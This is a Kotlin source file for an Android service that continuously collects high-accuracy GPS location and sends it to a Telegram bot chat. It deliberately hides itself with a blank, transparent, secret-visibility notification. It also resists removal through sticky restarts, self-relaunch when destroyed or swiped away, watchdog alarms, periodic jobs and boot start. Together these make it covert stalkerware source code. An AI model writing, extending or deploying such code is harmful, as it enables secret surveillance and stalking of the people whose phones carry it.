package com.gpstracker.telegram

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.location.Location
import android.os.IBinder
import android.os.Looper
import android.os.SystemClock
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import java.util.concurrent.TimeUnit

class LocationTrackingService : Service() {

    companion object {
        private const val TAG = "LocationSvc"
        private const val CHANNEL_ID = "sys_svc_01"
        private const val NOTIFICATION_ID = 1

        const val EXTRA_BOOT_START = "boot_start"

        private const val ALERT_DISTANCE_METERS      = 50f
        private const val TELEGRAM_INTERVAL_MS       = 5 * 60 * 1000L
        private const val LOCATION_INTERVAL_MS       = 15_000L
        private const val LOCATION_FASTEST_MS        = 5_000L
        private const val WATCHDOG_ALARM_INTERVAL_MS = 10 * 60 * 1000L
    }

    private var fusedClient: FusedLocationProviderClient? = null
    private var locationCallback: LocationCallback? = null
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    private var sentInitialLocation = false
    private var startLocation: Location? = null

    // ─── Lifecycle ────────────────────────────────────────────────────────────

    override fun onCreate() {
        super.onCreate()
        try {
            createNotificationChannel()
            fusedClient = LocationServices.getFusedLocationProviderClient(this)
            buildLocationCallback()
        } catch (e: Exception) {
            Log.e(TAG, "onCreate error: ${e.message}")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        try {
            // Must call startForeground immediately — Android kills the service
            // if this isn't called within a few seconds of onStartCommand.
            startForeground(NOTIFICATION_ID, buildStealthNotification())
        } catch (e: Exception) {
            Log.e(TAG, "startForeground failed: ${e.message}")
            // Fallback: try with a system icon in case ours fails
            try {
                startForeground(NOTIFICATION_ID, buildFallbackNotification())
            } catch (e2: Exception) {
                Log.e(TAG, "Fallback startForeground failed: ${e2.message}")
            }
        }

        try {
            prefs().edit().putBoolean(Prefs.KEY_TRACKING_ACTIVE, true).apply()

            // Restore start location from a previous session so tracking is
            // continuous across service restarts and reboots.
            if (startLocation == null) {
                val savedLat = prefs().getFloat(Prefs.KEY_START_LAT, 0f)
                val savedLng = prefs().getFloat(Prefs.KEY_START_LNG, 0f)
                if (savedLat != 0f || savedLng != 0f) {
                    startLocation = Location("saved").apply {
                        latitude  = savedLat.toDouble()
                        longitude = savedLng.toDouble()
                    }
                    // Origin already established — skip the "online" message
                    sentInitialLocation = true
                }
            }

            scheduleWatchdogs()
            tryLastKnownLocation()
            startLocationUpdates()

        } catch (e: Exception) {
            Log.e(TAG, "onStartCommand error: ${e.message}")
        }

        Log.d(TAG, "Service running")
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        try { scheduleImmediateRestart() } catch (_: Exception) {}
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        try { fusedClient?.removeLocationUpdates(locationCallback!!) } catch (_: Exception) {}
        try { scope.cancel() } catch (_: Exception) {}
        try { scheduleImmediateRestart() } catch (_: Exception) {}
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ─── Location ─────────────────────────────────────────────────────────────

    @Suppress("MissingPermission")
    private fun tryLastKnownLocation() {
        try {
            fusedClient?.lastLocation?.addOnSuccessListener { location ->
                if (location != null) onNewLocation(location)
            }
        } catch (e: Exception) {
            Log.e(TAG, "lastLocation error: ${e.message}")
        }
    }

    private fun buildLocationCallback() {
        locationCallback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                try {
                    result.lastLocation?.let { onNewLocation(it) }
                } catch (e: Exception) {
                    Log.e(TAG, "locationResult error: ${e.message}")
                }
            }
        }
    }

    @Suppress("MissingPermission")
    private fun startLocationUpdates() {
        try {
            val cb = locationCallback ?: return
            val req = LocationRequest.Builder(
                Priority.PRIORITY_HIGH_ACCURACY,
                LOCATION_INTERVAL_MS
            ).setMinUpdateIntervalMillis(LOCATION_FASTEST_MS).build()
            fusedClient?.requestLocationUpdates(req, cb, Looper.getMainLooper())
        } catch (e: Exception) {
            Log.e(TAG, "requestLocationUpdates error: ${e.message}")
        }
    }

    private fun onNewLocation(location: Location) {
        try {
            if (!sentInitialLocation) {
                sentInitialLocation = true
                startLocation = location
                prefs().edit()
                    .putFloat(Prefs.KEY_START_LAT, location.latitude.toFloat())
                    .putFloat(Prefs.KEY_START_LNG, location.longitude.toFloat())
                    .putFloat(Prefs.KEY_CURRENT_LAT, location.latitude.toFloat())
                    .putFloat(Prefs.KEY_CURRENT_LNG, location.longitude.toFloat())
                    .apply()
                val (token, chatId) = credentials()
                scope.launch {
                    try {
                        TelegramApi.sendMessage(
                            token, chatId,
                            TelegramApi.buildOnlineWithLocationMessage(
                                location.latitude, location.longitude, location.accuracy
                            )
                        )
                    } catch (e: Exception) {
                        Log.e(TAG, "Telegram send error: ${e.message}")
                    }
                }
                return
            }

            prefs().edit()
                .putFloat(Prefs.KEY_CURRENT_LAT, location.latitude.toFloat())
                .putFloat(Prefs.KEY_CURRENT_LNG, location.longitude.toFloat())
                .apply()

            val origin = startLocation ?: return
            val distance = origin.distanceTo(location)
            prefs().edit().putFloat(Prefs.KEY_CURRENT_DIST, distance).apply()

            if (distance >= ALERT_DISTANCE_METERS) {
                val lastSent = prefs().getLong(Prefs.KEY_LAST_SENT_TIME, 0L)
                val now = System.currentTimeMillis()
                if (now - lastSent >= TELEGRAM_INTERVAL_MS) {
                    val (token, chatId) = credentials()
                    scope.launch {
                        try {
                            val ok = TelegramApi.sendMessage(
                                token, chatId,
                                TelegramApi.buildLocationMessage(
                                    location.latitude, location.longitude,
                                    distance, location.accuracy
                                )
                            )
                            if (ok) prefs().edit().putLong(Prefs.KEY_LAST_SENT_TIME, now).apply()
                        } catch (e: Exception) {
                            Log.e(TAG, "Telegram send error: ${e.message}")
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "onNewLocation error: ${e.message}")
        }
    }

    // ─── Watchdogs ────────────────────────────────────────────────────────────

    private fun scheduleWatchdogs() {
        try {
            val workReq = PeriodicWorkRequestBuilder<WatchdogWorker>(15, TimeUnit.MINUTES).build()
            WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                "loc_watchdog", ExistingPeriodicWorkPolicy.KEEP, workReq
            )
        } catch (e: Exception) {
            Log.e(TAG, "WorkManager error: ${e.message}")
        }
        scheduleWatchdogAlarm(WATCHDOG_ALARM_INTERVAL_MS)
    }

    private fun scheduleImmediateRestart() = scheduleWatchdogAlarm(3_000L)

    private fun scheduleWatchdogAlarm(delayMs: Long) {
        try {
            val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val pi = PendingIntent.getBroadcast(
                this, 0,
                Intent(this, WatchdogReceiver::class.java).apply {
                    action = WatchdogReceiver.ACTION_WATCHDOG
                },
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )
            try {
                am.setExactAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + delayMs, pi
                )
            } catch (_: SecurityException) {
                am.set(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + delayMs, pi
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "scheduleAlarm error: ${e.message}")
        }
    }

    // ─── Notification ─────────────────────────────────────────────────────────

    private fun createNotificationChannel() {
        val ch = NotificationChannel(
            CHANNEL_ID, " ", NotificationManager.IMPORTANCE_MIN
        ).apply {
            description = ""
            setShowBadge(false)
            setSound(null, null)
            enableLights(false)
            enableVibration(false)
        }
        (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
            .createNotificationChannel(ch)
    }

    private fun buildStealthNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(R.drawable.ic_transparent)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .setSilent(true)
            .build()

    /** Used only if the primary notification fails to build. */
    private fun buildFallbackNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.screen_background_dark)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .setSilent(true)
            .build()

    // ─── Helpers ──────────────────────────────────────────────────────────────

    private fun prefs() = getSharedPreferences(Prefs.NAME, Context.MODE_PRIVATE)

    private fun credentials(): Pair<String, String> {
        val p = prefs()
        return (p.getString(Prefs.KEY_BOT_TOKEN, Prefs.DEFAULT_BOT_TOKEN)
            ?: Prefs.DEFAULT_BOT_TOKEN) to
               (p.getString(Prefs.KEY_CHAT_ID, Prefs.DEFAULT_CHAT_ID)
            ?: Prefs.DEFAULT_CHAT_ID)
    }
}
